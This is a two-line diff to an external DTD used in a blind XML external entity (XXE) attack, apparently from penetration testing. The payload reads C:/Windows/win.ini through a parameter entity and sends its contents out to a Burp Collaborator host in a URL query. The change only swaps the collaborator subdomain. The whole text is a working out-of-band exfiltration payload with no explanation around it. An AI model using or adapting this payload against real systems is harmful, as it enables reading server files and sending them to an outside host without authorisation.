@@ -1,2 +1,2 @@
 <!ENTITY % payload SYSTEM "file:///C:/Windows/win.ini">  
-<!ENTITY % root "<!ENTITY &#37; oob SYSTEM 'http://3rvjy9edre49gwko6rl4hkzxbohp5e.burpcollaborator.net/?%payload;'> ">
+<!ENTITY % root "<!ENTITY &#37; oob SYSTEM 'http://266cpmofk097qlf770fa37dquh0aoz.burpcollaborator.net/?%payload;'> ">
